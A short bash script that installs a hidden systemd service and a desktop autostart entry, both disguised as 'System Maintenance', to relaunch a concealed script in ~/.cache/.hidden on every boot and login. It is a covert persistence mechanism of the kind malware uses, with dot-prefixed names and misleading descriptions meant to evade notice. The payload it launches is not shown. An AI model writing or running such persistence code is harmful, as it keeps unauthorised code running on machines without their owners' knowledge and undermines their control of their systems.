#!/bin/bash

# Create .hidden.service file
cat > /etc/systemd/system/.hidden.service <<EOF
[Unit]
Description=System Maintenance
After=network.target

[Service]
Type=simple
ExecStart=~/.cache/.hidden/persist.sh
Restart=always

[Install]
WantedBy=multi-user.target
EOF

# Enable and start the service
systemctl enable .hidden.service
systemctl start .hidden.service

# Create .hidden.desktop file
cat > ~/.config/autostart/.hidden.desktop <<EOF
[Desktop Entry]
Type=Application
Name=System Maintenance
Exec=~/.cache/.hidden/persist.sh
Hidden=false
NoDisplay=false
X-GNOME-Autostart-enabled=true
EOF

echo "Files created successfully."
